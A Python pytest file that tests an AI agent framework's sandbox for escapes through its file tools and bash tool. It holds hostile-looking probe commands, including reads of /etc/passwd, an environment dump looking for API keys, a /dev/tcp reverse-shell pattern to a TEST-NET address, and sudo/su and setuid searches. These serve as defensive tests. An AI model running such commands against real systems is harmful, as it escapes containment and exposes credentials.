"""Sandbox security tests — verify CWD isolation across all tools.

Every test here represents an attack vector. Tests are grouped by tool and
attack technique. All attacks are HARMLESS (read-only probes or writes to
tmp_path). The goal is to verify that the sandbox blocks each vector.

Expected results BEFORE sandbox hardening:
  - File tools (read/write/edit/glob/grep): PASS (safe_resolve blocks traversal)
  - BashTool: FAIL (no OS-level isolation, commands can escape CWD)

Expected results AFTER sandbox hardening (namespace + chroot):
  - All tests: PASS
"""

import os
import platform
import pytest
from pathlib import Path

from agentpod.tools.bash import BashTool
from agentpod.tools.read import ReadTool
from agentpod.tools.write import WriteTool
from agentpod.tools.edit import EditTool
from agentpod.tools.glob_tool import GlobTool
from agentpod.tools.grep import GrepTool
from agentpod.tools.base import safe_resolve


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def tmp_cwd(tmp_path):
    """CWD with a known file for testing."""
    (tmp_path / "AGENTS.md").write_text("# Test Agent")
    (tmp_path / "sessions").mkdir()
    (tmp_path / "hello.txt").write_text("hello from cwd")
    (tmp_path / "subdir").mkdir()
    (tmp_path / "subdir" / "nested.txt").write_text("nested file")
    return tmp_path


@pytest.fixture
def bash():
    return BashTool()

@pytest.fixture
def read():
    return ReadTool()

@pytest.fixture
def write():
    return WriteTool()

@pytest.fixture
def edit():
    return EditTool()

@pytest.fixture
def glob():
    return GlobTool()

@pytest.fixture
def grep():
    return GrepTool()


# ===================================================================
# 1. safe_resolve unit tests (the core path-checking function)
# ===================================================================

class TestSafeResolve:
    """Direct tests on the safe_resolve function."""

    def test_relative_path_inside_cwd(self, tmp_cwd):
        result = safe_resolve("hello.txt", tmp_cwd)
        assert result == (tmp_cwd / "hello.txt").resolve()

    def test_relative_traversal_blocked(self, tmp_cwd):
        with pytest.raises(PermissionError):
            safe_resolve("../../etc/passwd", tmp_cwd)

    def test_absolute_path_outside_cwd_blocked(self, tmp_cwd):
        with pytest.raises(PermissionError):
            safe_resolve("/etc/passwd", tmp_cwd)

    def test_absolute_path_inside_cwd_allowed(self, tmp_cwd):
        target = tmp_cwd / "hello.txt"
        result = safe_resolve(str(target), tmp_cwd)
        assert result == target.resolve()

    def test_dot_dot_in_middle_blocked(self, tmp_cwd):
        """subdir/../../etc/passwd — traverses out via intermediate .."""
        with pytest.raises(PermissionError):
            safe_resolve("subdir/../../etc/passwd", tmp_cwd)

    def test_dot_dot_resolves_back_into_cwd_allowed(self, tmp_cwd):
        """subdir/../hello.txt — goes up but stays in CWD."""
        result = safe_resolve("subdir/../hello.txt", tmp_cwd)
        assert result == (tmp_cwd / "hello.txt").resolve()

    @pytest.mark.skipif(platform.system() == "Windows", reason="symlinks need privileges on Windows")
    def test_symlink_escape_blocked(self, tmp_cwd, tmp_path_factory):
        """Symlink inside CWD pointing to outside directory."""
        outside_dir = tmp_path_factory.mktemp("outside")
        (outside_dir / "secret.txt").write_text("secret data")
        symlink = tmp_cwd / "escape_link"
        symlink.symlink_to(outside_dir)
        with pytest.raises(PermissionError):
            safe_resolve("escape_link/secret.txt", tmp_cwd)

    @pytest.mark.skipif(platform.system() == "Windows", reason="symlinks need privileges on Windows")
    def test_symlink_file_escape_blocked(self, tmp_cwd, tmp_path_factory):
        """Symlink file inside CWD pointing to file outside CWD."""
        outside_dir = tmp_path_factory.mktemp("outside")
        secret = outside_dir / "secret.txt"
        secret.write_text("secret")
        symlink = tmp_cwd / "link_to_secret.txt"
        symlink.symlink_to(secret)
        with pytest.raises(PermissionError):
            safe_resolve("link_to_secret.txt", tmp_cwd)

    def test_null_byte_in_path(self, tmp_cwd):
        """Null byte injection — should raise or be blocked.
        Python 3.13+ silently strips null bytes in Path, so we also
        verify the resolved path stays inside CWD."""
        try:
            result = safe_resolve("hello.txt\x00../../etc/passwd", tmp_cwd)
            # If it didn't raise, it must still be inside CWD
            assert str(result).startswith(str(tmp_cwd.resolve()))
        except (PermissionError, ValueError, OSError):
            pass  # Blocked — good

    def test_encoded_traversal(self, tmp_cwd):
        """URL-encoded dots — safe_resolve works on raw strings, not URLs,
        but verify it doesn't accidentally decode."""
        # This should either raise PermissionError or just fail to find the file
        # The key is it must NOT resolve to /etc/passwd
        try:
            result = safe_resolve("..%2F..%2Fetc%2Fpasswd", tmp_cwd)
            # If it resolves, it must be inside CWD
            assert str(result).startswith(str(tmp_cwd.resolve()))
        except (PermissionError, OSError):
            pass  # Blocked — good


# ===================================================================
# 2. ReadTool — path traversal attacks
# ===================================================================

class TestReadToolSecurity:

    async def test_relative_traversal(self, read, tmp_cwd):
        result = await read.execute({"file_path": "../../etc/passwd"}, tmp_cwd)
        assert result.is_error
        assert "outside" in result.content.lower() or "permission" in result.content.lower()

    async def test_absolute_path_outside(self, read, tmp_cwd):
        result = await read.execute({"file_path": "/etc/hostname"}, tmp_cwd)
        assert result.is_error

    async def test_deep_traversal(self, read, tmp_cwd):
        result = await read.execute(
            {"file_path": "subdir/../../../../../../../etc/passwd"}, tmp_cwd
        )
        assert result.is_error

    @pytest.mark.skipif(platform.system() == "Windows", reason="symlinks")
    async def test_symlink_escape(self, read, tmp_cwd, tmp_path_factory):
        outside = tmp_path_factory.mktemp("outside")
        (outside / "secret.txt").write_text("secret")
        (tmp_cwd / "link").symlink_to(outside / "secret.txt")
        result = await read.execute({"file_path": "link"}, tmp_cwd)
        assert result.is_error


# ===================================================================
# 3. WriteTool — path traversal attacks
# ===================================================================

class TestWriteToolSecurity:

    async def test_write_outside_cwd(self, write, tmp_cwd):
        result = await write.execute(
            {"file_path": "../../evil.txt", "content": "pwned"}, tmp_cwd
        )
        assert result.is_error

    async def test_write_absolute_path(self, write, tmp_cwd):
        result = await write.execute(
            {"file_path": "/tmp/evil.txt", "content": "pwned"}, tmp_cwd
        )
        assert result.is_error

    async def test_write_via_deep_traversal(self, write, tmp_cwd):
        result = await write.execute(
            {"file_path": "subdir/../../../../../../tmp/evil.txt", "content": "pwned"},
            tmp_cwd,
        )
        assert result.is_error

    @pytest.mark.skipif(platform.system() == "Windows", reason="symlinks")
    async def test_write_via_symlink(self, write, tmp_cwd, tmp_path_factory):
        outside = tmp_path_factory.mktemp("outside")
        (tmp_cwd / "link_dir").symlink_to(outside)
        result = await write.execute(
            {"file_path": "link_dir/evil.txt", "content": "pwned"}, tmp_cwd
        )
        assert result.is_error
        assert not (outside / "evil.txt").exists()


# ===================================================================
# 4. EditTool — path traversal attacks
# ===================================================================

class TestEditToolSecurity:

    async def test_edit_outside_cwd(self, edit, tmp_cwd):
        result = await edit.execute(
            {"file_path": "../../etc/hostname", "old_string": "x", "new_string": "y"},
            tmp_cwd,
        )
        assert result.is_error

    async def test_edit_absolute_path(self, edit, tmp_cwd):
        result = await edit.execute(
            {"file_path": "/etc/hostname", "old_string": "x", "new_string": "y"},
            tmp_cwd,
        )
        assert result.is_error


# ===================================================================
# 5. GlobTool — path traversal attacks
# ===================================================================

class TestGlobToolSecurity:

    async def test_glob_outside_cwd(self, glob, tmp_cwd):
        result = await glob.execute({"pattern": "*.txt", "path": "../../"}, tmp_cwd)
        assert result.is_error

    async def test_glob_absolute_path(self, glob, tmp_cwd):
        result = await glob.execute({"pattern": "*.conf", "path": "/etc"}, tmp_cwd)
        assert result.is_error


# ===================================================================
# 6. GrepTool — path traversal attacks
# ===================================================================

class TestGrepToolSecurity:

    async def test_grep_outside_cwd(self, grep, tmp_cwd):
        result = await grep.execute(
            {"pattern": "root", "path": "../../etc/passwd"}, tmp_cwd
        )
        assert result.is_error

    async def test_grep_absolute_path(self, grep, tmp_cwd):
        result = await grep.execute(
            {"pattern": "root", "path": "/etc/passwd"}, tmp_cwd
        )
        assert result.is_error


# ===================================================================
# 7. BashTool — CWD escape attacks (NO sandbox currently)
#
# These tests document the EXPECTED behavior after sandbox is
# implemented. Before that, they will FAIL (marked xfail).
# ===================================================================

# Marker for tests that require sandbox (will fail without it)
needs_sandbox = pytest.mark.xfail(
    reason="BashTool has no sandbox yet — commands can escape CWD",
    strict=False,
)

is_linux = platform.system() == "Linux"


class TestBashToolSecurity:
    """BashTool escape attacks.

    These are all HARMLESS — they only READ system info or write to
    the test's own tmp directory. Nothing destructive.
    """

    # --- 7.1 Read files outside CWD ---

    @needs_sandbox
    async def test_cat_etc_hostname(self, bash, tmp_cwd):
        """Read a harmless system file via cat."""
        result = await bash.execute({"command": "cat /etc/hostname"}, tmp_cwd)
        # After sandbox: should fail (file not visible)
        assert result.is_error or result.content.strip() == ""

    @needs_sandbox
    async def test_cat_etc_passwd(self, bash, tmp_cwd):
        """Read /etc/passwd — classic traversal target."""
        result = await bash.execute({"command": "cat /etc/passwd"}, tmp_cwd)
        assert result.is_error or "root" not in result.content

    @needs_sandbox
    async def test_read_proc_self(self, bash, tmp_cwd):
        """Read /proc/self/cmdline — leaks process info."""
        result = await bash.execute(
            {"command": "cat /proc/self/cmdline 2>/dev/null || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content or "python" not in result.content

    # --- 7.2 List directories outside CWD ---

    @needs_sandbox
    async def test_ls_root(self, bash, tmp_cwd):
        """List the root filesystem."""
        result = await bash.execute({"command": "ls /"}, tmp_cwd)
        # After sandbox: should only see CWD contents or fail
        assert result.is_error or "etc" not in result.content

    @needs_sandbox
    async def test_ls_parent_directory(self, bash, tmp_cwd):
        """List parent of CWD via relative path."""
        result = await bash.execute({"command": "ls .."}, tmp_cwd)
        # After sandbox: .. should be CWD itself (chroot) or blocked
        assert result.is_error or "hello.txt" in result.content

    @needs_sandbox
    async def test_find_outside_cwd(self, bash, tmp_cwd):
        """Use find to enumerate files outside CWD."""
        result = await bash.execute(
            {"command": "find /etc -maxdepth 1 -name '*.conf' 2>/dev/null | head -5"},
            tmp_cwd,
        )
        assert result.is_error or result.content.strip() == ""

    # --- 7.3 Write files outside CWD ---

    @needs_sandbox
    async def test_write_to_tmp(self, bash, tmp_cwd):
        """Write a file to /tmp (outside CWD)."""
        marker = f"sandbox_test_{os.getpid()}"
        result = await bash.execute(
            {"command": f"echo {marker} > /tmp/{marker}.txt && echo written || echo failed"},
            tmp_cwd,
        )
        # Clean up just in case
        try:
            os.unlink(f"/tmp/{marker}.txt")
        except OSError:
            pass
        assert result.is_error or "failed" in result.content or "written" not in result.content

    @needs_sandbox
    async def test_mkdir_outside_cwd(self, bash, tmp_cwd):
        """Create directory outside CWD."""
        marker = f"sandbox_test_{os.getpid()}"
        result = await bash.execute(
            {"command": f"mkdir /tmp/{marker}_dir 2>&1 || echo blocked"},
            tmp_cwd,
        )
        try:
            os.rmdir(f"/tmp/{marker}_dir")
        except OSError:
            pass
        assert result.is_error or "blocked" in result.content

    # --- 7.4 Environment / process info leaks ---

    @needs_sandbox
    async def test_env_leak(self, bash, tmp_cwd):
        """Read environment variables — may contain API keys."""
        result = await bash.execute({"command": "env"}, tmp_cwd)
        # After sandbox: env should be sanitized, no API keys visible
        assert result.is_error or "VOLCENGINE_API_KEY" not in result.content

    @needs_sandbox
    async def test_whoami(self, bash, tmp_cwd):
        """Check running user — should not be root after sandbox."""
        result = await bash.execute({"command": "whoami"}, tmp_cwd)
        assert result.is_error or "root" not in result.content

    @needs_sandbox
    async def test_id_command(self, bash, tmp_cwd):
        """Check uid/gid — should not be uid=0."""
        result = await bash.execute({"command": "id"}, tmp_cwd)
        assert result.is_error or "uid=0" not in result.content

    # --- 7.5 Process manipulation ---

    @needs_sandbox
    async def test_ps_aux(self, bash, tmp_cwd):
        """List all processes — leaks info about other users/services."""
        result = await bash.execute({"command": "ps aux 2>/dev/null || echo blocked"}, tmp_cwd)
        # After sandbox (PID namespace): should only see own process
        assert result.is_error or "blocked" in result.content or result.content.count("\n") <= 3

    @needs_sandbox
    async def test_kill_other_process(self, bash, tmp_cwd):
        """Attempt to signal PID 1 — should fail in PID namespace."""
        result = await bash.execute(
            {"command": "kill -0 1 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content

    # --- 7.6 Network access ---

    @needs_sandbox
    async def test_network_curl(self, bash, tmp_cwd):
        """Attempt outbound HTTP — should be blocked or unavailable."""
        result = await bash.execute(
            {"command": "curl -s --max-time 3 http://ifconfig.me 2>&1 || echo blocked"},
            tmp_cwd,
        )
        assert result.is_error or "blocked" in result.content or result.content.strip() == ""

    @needs_sandbox
    async def test_network_wget(self, bash, tmp_cwd):
        """Attempt download via wget."""
        result = await bash.execute(
            {"command": "wget -q --timeout=3 -O- http://ifconfig.me 2>&1 || echo blocked"},
            tmp_cwd,
        )
        assert result.is_error or "blocked" in result.content or result.content.strip() == ""

    @needs_sandbox
    async def test_dns_lookup(self, bash, tmp_cwd):
        """DNS resolution — leaks network access capability."""
        result = await bash.execute(
            {"command": "nslookup example.com 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content

    # --- 7.7 Dangerous command patterns ---

    @needs_sandbox
    async def test_reverse_shell_attempt(self, bash, tmp_cwd):
        """Attempt a reverse shell pattern (to a non-routable address, harmless)."""
        result = await bash.execute(
            {"command": "bash -c 'echo test > /dev/tcp/192.0.2.1/4444' 2>&1 || echo blocked",
             "timeout": 3},
            tmp_cwd,
        )
        # 192.0.2.1 is TEST-NET, non-routable — will timeout or fail
        assert result.is_error or "blocked" in result.content

    @needs_sandbox
    async def test_crontab_access(self, bash, tmp_cwd):
        """Attempt to read crontab — should be blocked."""
        result = await bash.execute(
            {"command": "crontab -l 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content or "no crontab" in result.content

    @needs_sandbox
    async def test_systemctl_access(self, bash, tmp_cwd):
        """Attempt to list services — should be blocked."""
        result = await bash.execute(
            {"command": "systemctl list-units 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content

    # --- 7.8 Filesystem tricks ---

    @needs_sandbox
    @pytest.mark.skipif(not is_linux, reason="Linux-only symlink test")
    async def test_symlink_escape_via_bash(self, bash, tmp_cwd):
        """Create a symlink pointing outside CWD, then read through it."""
        result = await bash.execute(
            {"command": "ln -sf /etc/hostname escape_link && cat escape_link 2>&1 || echo blocked"},
            tmp_cwd,
        )
        # After sandbox: /etc/hostname doesn't exist in chroot
        assert result.is_error or "blocked" in result.content or result.content.strip() == ""

    @needs_sandbox
    async def test_hardlink_escape(self, bash, tmp_cwd):
        """Attempt to create a hard link to a file outside CWD."""
        result = await bash.execute(
            {"command": "ln /etc/hostname hardlink_escape 2>&1 || echo blocked"},
            tmp_cwd,
        )
        assert result.is_error or "blocked" in result.content

    @needs_sandbox
    @pytest.mark.skipif(not is_linux, reason="Linux /proc")
    async def test_proc_filesystem_access(self, bash, tmp_cwd):
        """Access /proc to read system info."""
        result = await bash.execute(
            {"command": "cat /proc/cpuinfo 2>/dev/null | head -5 || echo blocked"},
            tmp_cwd,
        )
        assert result.is_error or "blocked" in result.content or "model name" not in result.content

    @needs_sandbox
    @pytest.mark.skipif(not is_linux, reason="Linux /sys")
    async def test_sys_filesystem_access(self, bash, tmp_cwd):
        """Access /sys to read hardware info."""
        result = await bash.execute(
            {"command": "cat /sys/class/net/eth0/address 2>/dev/null || echo blocked"},
            tmp_cwd,
        )
        assert result.is_error or "blocked" in result.content

    # --- 7.9 Privilege escalation attempts ---

    @needs_sandbox
    async def test_sudo_attempt(self, bash, tmp_cwd):
        """Attempt sudo — should fail."""
        result = await bash.execute(
            {"command": "sudo id 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content or "root" not in result.content

    @needs_sandbox
    async def test_su_attempt(self, bash, tmp_cwd):
        """Attempt su — should fail."""
        result = await bash.execute(
            {"command": "su -c id 2>&1 || echo blocked"}, tmp_cwd
        )
        assert result.is_error or "blocked" in result.content or "root" not in result.content

    @needs_sandbox
    @pytest.mark.skipif(not is_linux, reason="Linux-only")
    async def test_setuid_check(self, bash, tmp_cwd):
        """Search for setuid binaries — should find none in chroot."""
        result = await bash.execute(
            {"command": "find / -perm -4000 2>/dev/null | head -5 || echo none"},
            tmp_cwd,
        )
        assert result.is_error or "none" in result.content or result.content.strip() == ""


# ===================================================================
# 8. BashTool — basic functionality SHOULD still work
#    (these must pass both before and after sandbox)
# ===================================================================

class TestBashToolFunctionality:
    """Verify that sandbox doesn't break legitimate operations."""

    async def test_echo(self, bash, tmp_cwd):
        result = await bash.execute({"command": "echo hello"}, tmp_cwd)
        assert not result.is_error
        assert "hello" in result.content

    async def test_read_file_in_cwd(self, bash, tmp_cwd):
        result = await bash.execute({"command": "cat hello.txt"}, tmp_cwd)
        assert not result.is_error
        assert "hello from cwd" in result.content

    async def test_write_file_in_cwd(self, bash, tmp_cwd):
        result = await bash.execute(
            {"command": "echo 'new content' > new_file.txt && cat new_file.txt"},
            tmp_cwd,
        )
        assert not result.is_error
        assert "new content" in result.content

    async def test_list_cwd(self, bash, tmp_cwd):
        result = await bash.execute({"command": "ls"}, tmp_cwd)
        assert not result.is_error
        assert "hello.txt" in result.content

    async def test_python_in_cwd(self, bash, tmp_cwd):
        result = await bash.execute(
            {"command": "python3 -c \"print(1+1)\""},
            tmp_cwd,
        )
        # On Windows, python3 may not exist; just verify no crash
        if not result.is_error:
            assert "2" in result.content
